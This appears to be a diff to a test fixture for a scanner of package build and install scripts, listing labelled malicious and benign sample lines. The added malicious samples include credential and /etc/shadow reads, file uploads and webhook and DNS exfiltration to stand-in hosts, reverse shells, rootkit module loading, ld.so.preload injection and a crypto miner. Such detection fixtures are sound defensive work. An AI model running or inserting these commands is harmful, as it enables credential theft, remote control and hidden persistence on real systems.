@@ -115,3 +115,41 @@ pipe-to-shell	+	build	w"g"et -qO- https://x.example/i | ba""sh
 named-pkg-install	+	build	n""pm i""nstall atomic-lockfile
 pipe-to-shell	-	build	echo "curl is used below"
 named-pkg-install	-	build	msg2 "npm ci runs next"
+cred-access	+	build	tar czf /tmp/k.tgz ~/.ssh
+cred-access	+	install	cp -r /home/*/.mozilla /var/tmp/x
+cred-access	+	file	cat "$HOME/.aws/credentials" > out
+cred-access	+	build	cat /etc/shadow
+cred-access	-	build	install -Dm644 ssh_config "$pkgdir/etc/ssh/ssh_config"
+cred-access	-	install	echo "copy your key into ~/.ssh first"
+exfil-upload	+	build	curl -s -F "f=@/etc/passwd" https://x.example/u
+exfil-upload	+	file	curl --data-binary @"$HOME/.bash_history" https://x.example
+exfil-upload	+	build	wget --post-file=/etc/hostname https://x.example/u
+exfil-upload	-	build	curl -fsSL -o out.tar.gz https://x.example/a.tar.gz
+exfil-webhook	+	file	curl -d x https://discord.com/api/webhooks/1/abc
+exfil-webhook	+	build	wget -q https://api.telegram.org/bot123:abc/sendMessage
+exfil-webhook	+	file	U=https://hooks.slack.com/services/T0/B0/x
+exfil-webhook	-	build	cp discord.desktop "$pkgdir/usr/share/applications/"
+exfil-dns	+	build	dig +short "$(whoami).x.example"
+exfil-dns	+	file	nslookup `hostname`.x.example
+exfil-dns	-	build	dig +short example.org
+revshell	+	install	nc -e /bin/sh 10.0.0.1 4444
+revshell	+	file	ncat 10.0.0.1 4444 -c bash
+revshell	+	build	socat tcp:x.example:4444 exec:/bin/sh
+revshell	+	install	mkfifo /tmp/f; cat /tmp/f | sh -i | nc x.example 1 > /tmp/f
+revshell	+	file	python3 -c "import socket;s=socket.socket();s.connect((1,2))"
+revshell	+	build	bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+revshell	-	build	install -Dm755 nc-helper "$pkgdir/usr/bin/nc-helper"
+kmod-insmod	+	install	insmod /var/tmp/.x/rk.ko
+kmod-insmod	-	build	make -C "$srcdir" modules
+kmod-modprobe	+	install	modprobe v4l2loopback
+kmod-modprobe	-	build	echo "run modprobe foo after install"
+bpf-pin	+	install	bpftool prog load x.o /sys/fs/bpf/hidden_pids
+bpf-pin	+	file	mount -t bpf bpf /sys/fs/bpf
+bpf-pin	-	build	install -Dm644 bpf.o "$pkgdir/usr/lib/x/bpf.o"
+ld-preload-file	+	install	echo /usr/lib/x.so >> /etc/ld.so.preload
+ld-preload-file	-	build	install -Dm644 x.so "$pkgdir/usr/lib/x.so"
+ld-preload	+	build	LD_PRELOAD=./hook.so ./configure
+ld-preload	-	build	export LD_LIBRARY_PATH="$srcdir/lib"
+miner	+	file	./xmrig -o stratum+tcp://pool.x.example:3333 -u w
+miner	+	build	W=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A
+miner	-	build	cmake -DWITH_STRATUM=OFF ..
